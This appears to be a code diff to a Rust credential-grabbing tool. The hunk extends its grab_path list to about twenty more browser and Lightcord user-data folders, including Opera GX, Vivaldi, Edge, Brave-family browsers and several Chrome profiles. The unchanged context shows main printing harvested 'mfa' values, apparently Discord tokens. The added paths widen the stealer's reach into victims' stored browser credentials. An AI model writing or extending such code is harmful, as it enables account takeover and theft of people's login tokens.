@@ -92,6 +92,26 @@ fn grab_path() -> Vec<String> {
                 format!("{}/Opera Software/Opera Stable", roaming),
                 format!("{}/BraveSoftware/Brave-Browser/User Data/Default", local),
                 format!("{}/Yandex/YandexBrowser/User Data/Default", local),
+                format!("{}/Lightcord/", roaming),
+                format!("{}/Opera Software/Opera GX Stable/", roaming),
+                format!("{}/Amigo/User Data/", local),
+                format!("{}/Torch/User Data/", local),
+                format!("{}/Kometa/User Data/", local),
+                format!("{}/Orbitum/User Data/", local),
+                format!("{}/CentBrowser/User Data/", local),
+                format!("{}/7Star/7Star/User Data/", local),
+                format!("{}/Sputnik/Sputnik/User Data/", local),
+                format!("{}/Vivaldi/User Data/Default/", local),
+                format!("{}/Google/Chrome SxS/User Data/", local),
+                format!("{}/Google/Chrome/User Data/Profile 1/", local),
+                format!("{}/Google/Chrome/User Data/Profile 2/", local),
+                format!("{}/Google/Chrome/User Data/Profile 3/", local),
+                format!("{}/Google/Chrome/User Data/Profile 4/", local),
+                format!("{}/Google/Chrome/User Data/Profile 5/", local),
+                format!("{}/Epic Privacy Browser/User Data/", local),
+                format!("{}/Microsoft/Edge/User Data/Default/", local),
+                format!("{}/uCozMedia/Uran/User Data/Default/", local),
+                format!("{}/Iridium/User Data/Default/", local),
             ];
 
             target_locations.extend(paths);
@@ -144,4 +164,3 @@ fn main() {
         println!("\x1B[32m{}\x1B[0m", mfa);
     }
 }
-
